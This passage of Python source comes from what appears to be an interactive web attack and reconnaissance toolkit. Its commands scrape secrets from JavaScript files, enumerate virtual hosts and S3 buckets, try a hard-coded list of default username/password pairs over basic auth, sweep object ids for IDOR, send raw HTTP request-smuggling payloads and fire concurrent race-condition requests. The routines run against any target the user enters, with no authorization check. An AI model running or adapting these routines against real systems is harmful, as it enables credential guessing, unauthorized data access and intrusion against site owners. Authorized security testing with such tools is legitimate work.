        if absolute not in resolved:
            resolved.append(absolute)
    inline = re.findall(r"<script[^>]*>(.*?)</script>", page.text or "", re.S | re.I)
    nf.section(f"javascript secret harvest — {len(resolved)} file(s)")
    blobs = [(f"inline#{i}", chunk[:400_000]) for i, chunk in enumerate(inline[:10])]
    for script_url in resolved[:15]:
        r = nf.http(script_url, nf.CFG, body_limit=3_000_000,
                    timeout=max(10, nf.CFG["timeout"]))
        if r.error or r.status != 200:
            nf.kv(script_url.split("/")[-1][:30], f"skip ({r.error or r.status})", nf.P.dim)
            continue
        blobs.append((script_url, r.text or ""))
    hits = 0
    for origin, text in blobs:
        for label, pattern in SECRET_PATTERNS.items():
            for match in re.finditer(pattern, text):
                raw_match = match.group(0)
                if raw_match in ("", None):
                    continue
                hits += 1
                nf.finding("HIGH", label, f"{_redact(raw_match)}  ← {origin.split('/')[-1][:40]}")
    nf.finding("OK" if not hits else "HIGH", f"{hits} secret candidate(s)")
    if hits:
        nf.save_report(f"jssecrets_{_host(url)}", {"url": url, "hits": hits})

VHOST_WORDS = [
    "admin", "dev", "staging", "stage", "test", "beta", "internal", "intranet",
    "portal", "api", "app", "m", "mobile", "cdn", "static", "assets", "img",
    "mail", "webmail", "smtp", "vpn", "git", "jenkins", "ci", "monitor",
    "status", "docs", "wiki", "support", "help", "shop", "store", "blog",
    "dashboard", "panel", "cpanel", "db", "sql", "backup", "old", "new",
]

def cmd_vhost(nf):
    raw = nf.ask("target ip or host")
    if not raw:
        return
    target = raw.replace("https://", "").replace("http://", "").split("/")[0]
    hostname = nf.ask("base host header", target)
    scheme = nf.ask("scheme", "http")
    port = nf.ask("port", "443" if scheme == "https" else "80")
    connect = f"{target}:{port}" if ":" not in target else target
    nf.section(f"vhost enumeration — {connect}")
    try:
        base = nf.http(f"{scheme}://{hostname}/", nf.CFG, body_limit=300_000,
                       extra_headers={"Host": hostname})
    except Exception as exc:
        nf.finding("HIGH", "cannot reach target", str(exc)[:80])
        return
    base_len = len(base.text or "")
    hits = 0
    for word in VHOST_WORDS:
        candidate = f"{word}.{hostname}"
        try:
            r = nf.http(f"{scheme}://{connect}/", nf.CFG, body_limit=200_000,
                        extra_headers={"Host": candidate},
                        timeout=min(6, max(2, nf.CFG["timeout"])))
        except Exception:
            continue
        if r.error:
            continue
        if r.status != base.status or abs(len(r.text or "") - base_len) > max(60, base_len * 0.1):
            hits += 1
            nf.finding("HIGH", candidate, f"status {r.status}  {len(r.text or '')} B")
    nf.finding("OK" if not hits else "HIGH", f"{hits} distinct vhost(s)")

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", "changeme"), ("admin", "letmein"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("user", "user"), ("test", "test"), ("guest", "guest"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("tomcat", "tomcat"), ("manager", "manager"), ("support", "support"),
]

def cmd_default_creds(nf):
    raw = nf.ask("url (basic auth or login endpoint)")
    if not raw:
        return
    url = nf.normalize_url(raw)
    nf.section(f"default credential sweep — {len(DEFAULT_CREDS)} pairs")
    hits = 0
    for user, password in DEFAULT_CREDS:
        blob = base64.b64encode(f"{user}:{password}".encode()).decode()
        r = nf.http(url, nf.CFG, body_limit=200_000, allow_redirects=False,
                    extra_headers={"Authorization": f"Basic {blob}"})
        if r.error:
            continue
        if r.status in (200, 302) and r.status != 401:
            hits += 1
            nf.finding("HIGH", "credential accepted", f"{user}:{password}  (status {r.status})")
    if not hits:
        nf.finding("OK", "no basic-auth default worked — try the form endpoint with a post body")
    if hits:
        nf.save_report(f"creds_{_host(url)}", {"url": url, "pairs": hits})

def cmd_idor(nf):
    raw = nf.ask("url with a numeric id")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    numeric = [p for p, v in params.items() if v.isdigit()]
    if not numeric:
        nf.finding("MED", "no numeric parameter in url")
        return
    target = nf.ask("parameter", numeric[0])
    start = nf.ask("start id", "1")
    count = nf.ask("how many", "40")
    try:
        start = int(start)
        count = max(1, min(200, int(count)))
    except ValueError:
        nf.finding("MED", "bad range")
        return
    nf.section(f"idor sweep — {target} {start}..{start+count-1}")
    base = nf.http(_with_param(url, target, str(start)), nf.CFG, body_limit=300_000)
    if base.error:
        nf.finding("HIGH", "request failed", base.error[:100])
        return
    base_len = len(base.text or "")
    hits = []
    for offset in range(count):
        value = start + offset
        r = nf.http(_with_param(url, target, str(value)), nf.CFG, body_limit=300_000,
                    timeout=min(8, max(3, nf.CFG["timeout"])))
        if r.error:
            continue
        size = len(r.text or "")
        if r.status == 200 and size > 200 and abs(size - base_len) > 100:
            hits.append(value)
            nf.finding("HIGH", f"id {value}", f"{size} B (baseline {base_len})")
    nf.finding("OK" if not hits else "HIGH", f"{len(hits)} accessible object(s)")
    if hits:
        nf.save_report(f"idor_{_host(url)}", hits)

def _raw_request(host, port, payload, timeout=6):
    started = time.time()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if port == 443:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(payload)
        chunks = []
        try:
            while True:
                blob = sock.recv(4096)
                if not blob:
                    break
                chunks.append(blob)
                if sum(len(c) for c in chunks) > 200_000:
                    break
        except socket.timeout:
            pass
        sock.close()
        return b"".join(chunks), time.time() - started
    except Exception:
        return b"", time.time() - started

def cmd_smuggling(nf):
    raw = nf.ask("target host")
    if not raw:
        return
    host = raw.replace("https://", "").replace("http://", "").split("/")[0]
    port = nf.ask("port", "443" if "s" in nf.ask("tls? (y/n)", "y") else "80")
    try:
        port = int(port)
    except ValueError:
        port = 443
    nf.section(f"request smuggling probe — {host}:{port}")
    probes = {
        "cl.te": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
        ).encode(),
        "te.cl": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
        ).encode(),
        "te.space": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
            f"Transfer-Encoding : chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"
        ).encode(),
        "cl.dup": (
            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
            f"Content-Length: 10\r\n\r\nnf=1"
        ).encode(),
    }
    signals = 0
    for label, payload in probes.items():
        blob, elapsed = _raw_request(host, port, payload)
        head = blob[:200].decode("utf-8", "replace").replace("\r", " ").replace("\n", " ")
        if not blob:
            nf.kv(label, "no response (possible hang)", nf.P.warn)
            signals += 1
        else:
            status = head.split(" ")[1] if len(head.split(" ")) > 1 else "?"
            nf.kv(label, f"status {status}  {elapsed:.2f}s")
            if status in ("400", "408", "501", "505") or "smuggled" in head.lower():
                signals += 1
                nf.finding("MED", f"{label} desync hint", head[:110])
    nf.finding("OK" if not signals else "MED", f"{signals} desync signal(s) — confirm with a proper tool")
    nf.note("a single probe cannot prove smuggling; verify with request queues on a lab host")

def cmd_s3_enum(nf):
    domain = nf.ask("domain / company name")
    if not domain:
        return
    bare = domain.replace("https://", "").replace("http://", "").split("/")[0]
    root = bare.split(".")[0]
    candidates = []
    for stem in (root, bare.replace(".", "-")):
        for suffix in ("", "-dev", "-test", "-staging", "-prod", "-backup",
                       "-backups", "-assets", "-static", "-media", "-files",
                       "-uploads", "-data", "-logs", "-private", "-public"):
            name = f"{stem}{suffix}"
            if name not in candidates:
                candidates.append(name)
    nf.section(f"bucket enumeration — {len(candidates)} candidates")

    def probe(bucket):
        r = nf.http(f"https://{bucket}.s3.amazonaws.com/", nf.CFG,
                    body_limit=20_000, timeout=min(6, max(2, nf.CFG["timeout"])))
        if r.error:
            return None
        if r.status == 200 and "<ListBucketResult" in (r.text or ""):
            return (bucket, "OPEN — listing allowed", "HIGH")
        if r.status == 200:
            return (bucket, "reachable", "MED")
        if r.status == 403:
            return (bucket, "exists, private", "LOW")
        return None

    hits = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
        for res in pool.map(probe, candidates):
            if not res:
                continue
            bucket, note, sev = res
            hits += 1
            nf.finding(sev, bucket, note)
    nf.finding("OK" if not hits else "HIGH", f"{hits} bucket(s) found")
    if hits:
        nf.save_report(f"buckets_{root}", {"domain": bare, "found": hits})

API_HINTS = (
    "/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/swagger/v1/swagger.json", "/api/swagger.json", "/docs", "/redoc",
    "/api", "/api/v1", "/api/v2", "/rest", "/graphql", "/rpc",
)

def cmd_api_map(nf):
    raw = nf.ask("base url")
    if not raw:
        return
    base = nf.normalize_url(raw).rstrip("/")
    nf.section("api surface map")
    spec = None
    for path in API_HINTS[:10]:
        r = nf.http(base + path, nf.CFG, body_limit=2_000_000)
        if r.error or r.status != 200:
            continue
        text = r.text or ""
        if text.lstrip().startswith("{") and ('"paths"' in text or '"swagger"' in text or '"openapi"' in text):
            spec = (base + path, text)
            break
        if "swagger" in text.lower() and "<html" in text[:200].lower():
            nf.finding("MED", "swagger ui", base + path)
    if spec:
        url, text = spec
        nf.finding("HIGH", "machine-readable spec", url)
        try:
            data = json.loads(text)
        except Exception:
            data = {}
        paths = list((data.get("paths") or {}).keys())
        nf.kv("paths", len(paths))
        verbs = {}
        for route in paths[:80]:
            for method in (data.get("paths", {}).get(route) or {}):
                verbs[method.upper()] = verbs.get(method.upper(), 0) + 1
            nf.kv(route[:70], ",".join(m.upper() for m in (data["paths"][route] or {}))[:20])
        nf.kv("verbs", ", ".join(f"{k}:{v}" for k, v in sorted(verbs.items())))
        nf.save_report(f"api_{_host(url)}", {"spec": url, "paths": paths})
    else:
        nf.note("no openapi/swagger document exposed — probing common api roots")
        for path in API_HINTS[10:]:
            r = nf.http(base + path, nf.CFG, body_limit=60_000)
            if r.error:
                continue
            if r.status in (200, 401, 403):
                nf.finding("LOW", f"{r.status} {path}", f"{len(r.text or '')} B")

def cmd_race(nf):
    raw = nf.ask("url to hit concurrently")
    if not raw:
        return
    url = nf.normalize_url(raw)
    threads = nf.ask("concurrent requests", "20")
    try:
        threads = max(2, min(60, int(threads)))
    except ValueError:
        threads = 20
    nf.section(f"race condition — {threads} simultaneous requests")
    barrier = []
    results = []

    def worker():
        barrier.append(1)
        r = nf.http(url, nf.CFG, body_limit=200_000)
        return (r.status, len(r.text or ""), (r.text or "")[:80])

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(worker) for _ in range(threads)]
        for fut in concurrent.futures.as_completed(futures):
            try:
                results.append(fut.result())
            except Exception:
                pass
    from collections import Counter
    counts = Counter(results)
    nf.kv("distinct responses", len(counts))
    for (status, size, _), count in counts.most_common(6):
        nf.kv(f"{status} / {size} B", f"x{count}")
    if len(counts) > 1:
        nf.finding("MED", "state varied under concurrency", "verify with a business-logic target")
    else:
        nf.finding("OK", "uniform responses — no obvious race window")
